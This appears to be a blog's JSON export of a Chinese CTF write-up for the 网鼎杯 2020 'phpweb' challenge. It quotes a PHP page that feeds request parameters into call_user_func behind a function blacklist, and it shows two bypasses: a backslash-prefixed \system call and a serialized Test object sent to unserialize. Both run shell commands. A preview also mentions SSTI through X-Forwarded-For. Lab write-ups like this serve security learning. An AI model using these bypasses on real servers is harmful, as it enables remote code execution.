{"title":"网鼎杯 2020 朱雀组-phpweb","uid":"f8f3a659c238870b31876c2514d08de0","slug":"网鼎杯-2020-朱雀组-phpweb","date":"2023-07-24T12:55:51.000Z","updated":"2023-07-25T12:58:07.728Z","comments":true,"path":"api/articles/网鼎杯-2020-朱雀组-phpweb.json","keywords":null,"cover":null,"content":"<p>抓包查看参数，猜测func&#x3D;函数名，p&#x3D;参数</p>\n<p>func&#x3D;file_get_contents&amp;p&#x3D;index.php</p>\n<p>得到网页源码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);\n    function gettime($func, $p) &#123;\n        $result &#x3D; call_user_func($func, $p);\n        $a&#x3D; gettype($result);\n        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;\n            return $result;\n        &#125; else &#123;return &quot;&quot;;&#125;\n    &#125;\n    class Test &#123;\n        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;\n        var $func &#x3D; &quot;date&quot;;\n        function __destruct() &#123;\n            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;\n                echo gettime($this-&gt;func, $this-&gt;p);\n            &#125;\n        &#125;\n    &#125;\n    $func &#x3D; $_REQUEST[&quot;func&quot;];\n    $p &#x3D; $_REQUEST[&quot;p&quot;];\n\n    if ($func !&#x3D; null) &#123;\n        $func &#x3D; strtolower($func);\n        if (!in_array($func,$disable_fun)) &#123;\n            echo gettime($func, $p);\n        &#125;else &#123;\n            die(&quot;Hacker...&quot;);\n        &#125;\n    &#125;\n    ?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对func设置了黑名单，用于命令执行的函数几乎全部被过滤</p>\n<p>但是php内的” \\ “在做代码执行的时候，会识别特殊字符串，绕过黑名单</p>\n<p>func&#x3D;\\system，但是通过ls并没有发现flag，猜测答案并没有直接命名为flag</p>\n<p>通过find命令来查找，p&#x3D;find &#x2F; -name flag*</p>\n<p>找到后通过cat获取</p>\n<p>方法二</p>\n<p>由于Test类的__destruct函数中调用了gettime方法</p>\n<p>可以通过反序列化获取，传入的参数func&#x3D;unserialize</p>\n<p>p为Test类序列化</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\nclass Test &#123;\n    var $p;\n    var $func;\n&#125;\n\n$a &#x3D; new Test();\n$a-&gt;func &#x3D; &quot;system&quot;;\n$a-&gt;p &#x3D; &quot;find &#x2F; -name flag*&quot;;\n\necho urlencode(serialize($a));\n\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","feature":true,"text":"抓包查看参数，猜测func&#x3D;函数名，p&#x3D;参数 func&#x3D;file_get_contents&amp;p&#x3D;index.php 得到网页源码 &lt;?php $disable_fun &#x3D; array(&quot;exec&quot;...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"BSidesCF 2020-Had a bad day","uid":"1a272921836e2eda1856c55c52bc7b82","slug":"BSidesCF-2020-Had-a-bad-day","date":"2023-07-26T12:32:15.000Z","updated":"2023-07-26T12:37:04.268Z","comments":true,"path":"api/articles/BSidesCF-2020-Had-a-bad-day.json","keywords":null,"cover":null,"text":"http://ba0363ed-41fc-4957-bc0a-0dfadeee4552.node4.buuoj.cn:81/index.php?category=meowers 题目通过category传入参数来包含文件，通过php伪协议来读取index.php的内容 ?cate...","link":"","photos":[],"count_time":{"symbolsCount":830,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"BJDCTF2020-The mystery of ip","uid":"e9eccb0987b238d940e95539e441969f","slug":"BJDCTF2020-The-mystery-of-ip","date":"2023-07-24T12:11:34.000Z","updated":"2023-07-24T12:14:26.569Z","comments":true,"path":"api/articles/BJDCTF2020-The-mystery-of-ip.json","keywords":null,"cover":null,"text":"Flag页面中显示ip，尝试修改X-Forwarded-For，页面内容随之变化 SSTI注入 在X-Forwarded-For的内容后加上{7*7}，回显内容包括49 写入{system(‘ls’)} system(‘cat &#x2F;flag’)} 得到flag ","link":"","photos":[],"count_time":{"symbolsCount":135,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}